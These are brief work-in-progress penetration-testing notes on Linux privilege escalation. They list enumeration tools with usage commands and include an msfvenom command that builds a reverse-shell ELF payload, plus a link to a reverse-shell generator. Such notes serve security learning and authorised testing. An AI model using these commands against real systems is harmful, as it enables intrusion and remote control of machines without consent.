# Work in Progress

## automated scripts

linux smart enumeration: https://github.com/diego-treitos/linux-smart-enumeration
```
# print everything the script can gather 
./lse.sh -l 2 -i
```

Linenum - https://github.com/rebootuser/LinEnum
```
# export files to a directory and do thorough tests
./linenum.sh -t -e linenum
```

linpeas
linux exploit suggester

linux priv checker - https://github.com/linted/linuxprivchecker

beroot - https://github.com/AlessandroZ/BeRoot

unix -priv-checker - http://pentestmonkey.net/tools/audit/unix-privesc-check




## Reverse Shells 
```
msfvenom -p linux/x86/reverse_shell_tcp lhost= lport= -f elf -o rev_shell.elf
```

Native reverse shells:

reverse shell generator: https://github.com/mthbernardes/rsg 


